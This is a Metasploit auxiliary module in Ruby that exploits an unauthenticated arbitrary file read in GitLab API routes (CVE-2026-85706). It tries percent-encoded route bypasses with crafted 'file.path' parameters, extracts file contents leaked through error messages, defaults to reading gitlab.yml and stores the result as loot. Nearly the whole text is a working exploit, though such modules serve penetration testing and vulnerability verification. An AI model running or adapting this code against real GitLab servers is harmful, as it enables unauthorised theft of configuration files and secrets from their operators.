##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Gitlab
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  CHECK_FILE = '/opt/gitlab/embedded/service/gitlab-rails/config/application.rb'
  LEAK_PREFIX = 'Invalid parameter: invalid %-encoding ('
  BYPASS_ROUTES = [
    { method: 'POST', path: 'repository/%66iles/x' },
    { method: 'POST', path: '%72epository/files/x' },
    { method: 'PUT', path: 'repository/%66iles/x' },
    { method: 'PUT', path: '%72epository/files/x' },
    { method: 'POST', path: 'repository/%63ommits' },
    { method: 'POST', path: '%72epository/commits' },
    { method: 'POST', path: 'repository/commits/' },
    { method: 'POST', path: 'repository/commits.json' }
  ].freeze
  VULNERABLE_VERSION_RANGES = [
    [Rex::Version.new('18.7'), Rex::Version.new('19.1.8')].freeze,
    [Rex::Version.new('19.2'), Rex::Version.new('19.2.6')].freeze,
    [Rex::Version.new('19.3'), Rex::Version.new('19.3.2')].freeze
  ].freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GitLab Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module exploits CVE-2026-85706, an unauthenticated arbitrary file read
          in the GitLab repository commits and files APIs. A path parsing discrepancy
          between GitLab Workhorse and Rails allows unsigned upload metadata to reach
          the Rails handler, where an attacker-controlled local path is read before
          authentication.

          The response disclosure is conditional. GitLab returns a fragment of file
          data in an error only when the file contains a percent sign that is not
          followed by two hexadecimal characters. URL-form delimiters can further
          bound the returned fragment. Files without a malformed percent sequence are
          read but are not returned to the attacker.

          GitLab CE and EE versions from 18.7 before 19.1.8, 19.2 before 19.2.6, and
          19.3 before 19.3.2 are affected.
        },
        'Author' => [
          's3ntago', # Vulnerability discovery
          'guneykabel', # PoC
          'jheysel-r7' # Metasploit module
        ],
        'References' => [
          ['CVE', '2026-85706'],
          ['URL', 'https://github.com/guneykabel/cve-2026-85706'],
          ['URL', 'https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-3-2-released/'],
          ['URL', 'https://gitlab.com/gitlab-org/gitlab/-/commit/0d9ce3e758a85f0690be751e213625f7902c0361'],
          ['URL', 'https://www.rapid7.com/blog/post/etr-cve-2026-85706-critical-gitlab-path-traversal-exploited-in-the-wild/']
        ],
        'DisclosureDate' => '2026-09-10',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path of the GitLab application', '/']),
        OptInt.new('PROJECT_ID', [true, 'A GitLab project ID to place in the API route', 1]),
        OptString.new('FILEPATH', [true, 'The absolute path of the file to read', '/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml'])
      ]
    )
  end

  def check
    result = read_file(CHECK_FILE)
    if result[:status] == :leaked && result[:content].include?('::Gitlab::Patch::DatabaseConfig')
      report_vuln(host: rhost, name: name, refs: references)
      return Exploit::CheckCode::Vulnerable('The target returned a GitLab application source file')
    end

    versions = gitlab_version
    return Exploit::CheckCode::Unknown('GitLab was not detected') unless versions

    low_version, high_version = versions.map { |version| normalize_gitlab_version(version) }
    version_description = low_version == high_version ? low_version.to_s : "#{low_version} - #{high_version}"

    if VULNERABLE_VERSION_RANGES.any? { |first, last| low_version >= first && high_version < last }
      return Exploit::CheckCode::Appears("GitLab #{version_description} is vulnerable")
    end

    unless VULNERABLE_VERSION_RANGES.any? { |first, last| high_version >= first && low_version < last }
      return Exploit::CheckCode::Safe("GitLab #{version_description} is not vulnerable")
    end

    Exploit::CheckCode::Detected("GitLab #{version_description} spans vulnerable and fixed versions; the file read could not be verified (#{result[:status]})")
  rescue StandardError => e
    Exploit::CheckCode::Unknown("#{e.class}: #{e.message}")
  end

  def run
    file_path = datastore['FILEPATH']
    result = read_file(file_path)

    case result[:status]
    when :leaked
      loot_path = store_loot('gitlab.file', 'application/octet-stream', rhost, result[:content], File.basename(file_path), "GitLab file read: #{file_path}")
      print_good("Data from #{file_path} was read successfully and stored in: #{loot_path}")
      print_line(result[:content])
    when :missing
      fail_with(Failure::NotFound, "File #{file_path} does not exist or is not readable by GitLab")
    when :unauthorized
      fail_with(Failure::NoAccess, 'GitLab required authentication before returning file data')
    when :read_no_echo
      fail_with(Failure::UnexpectedReply, "GitLab read #{file_path}, but its contents did not trigger the percent-decoding error needed to return the data")
    when :unreachable
      fail_with(Failure::Unreachable, 'GitLab did not respond to any file read request')
    when :unexpected
      fail_with(Failure::UnexpectedReply, "GitLab returned HTTP #{result[:code]} without file data")
    else
      fail_with(Failure::UnexpectedReply, "The file contents were not returned (#{result[:status]})")
    end
  end

  private

  def normalize_gitlab_version(version)
    Rex::Version.new(version.to_s[/\d+\.\d+(?:\.\d+)*/])
  end

  def read_file(file_path)
    results = []
    base_path = normalize_uri(target_uri.path, 'api', 'v4', 'projects', datastore['PROJECT_ID'].to_s)

    BYPASS_ROUTES.each do |route|
      uri = "#{base_path}/#{route[:path]}"
      vprint_status("Trying #{route[:method]} #{uri}")

      res = send_request_cgi(
        'method' => route[:method],
        'uri' => uri,
        'vars_get' => {
          'file' => '',
          'file.path' => file_path,
          'file.size' => '1',
          'Content-Type' => 'application/x-www-form-urlencoded'
        }
      )
      next unless res

      result = classify_response(res)
      vprint_status("Received HTTP #{res.code}: #{result[:status]}")
      return result if result[:status] == :leaked

      results << result
    end

    return { status: :unreachable } if results.empty?

    %i[missing read_no_echo unauthorized partial rewrite unexpected project_gate].each do |status|
      result = results.find { |candidate| candidate[:status] == status }
      return result if result
    end

    results.last
  end

  def classify_response(res)
    json = res.get_json_document
    message = json&.fetch('error', nil) || json&.fetch('message', nil)
    message = message.to_s

    leak_start = message.index(LEAK_PREFIX)
    if leak_start && message.end_with?(')')
      return { status: :leaked, content: message[(leak_start + LEAK_PREFIX.length)...-1] }
    end

    return { status: :missing } if message.include?('local file not present') # local file is not present
    return { status: :rewrite } if message.include?('Invalid json') # request body was rewritten by Workhorse
    return { status: :partial } if message.include?('Invalid parameter type:') # parser returned only a parameter fragment
    return { status: :project_gate } if message.include?('404 Project Not Found') # project is not anonymously readable
    return { status: :unauthorized } if res.code == 401 # endpoint enforced authentication

    if message.include?('branch is required') || message.include?('commit_message is required')
      return { status: :read_no_echo }
    end

    { status: :unexpected, code: res.code, message: message }
  end
end
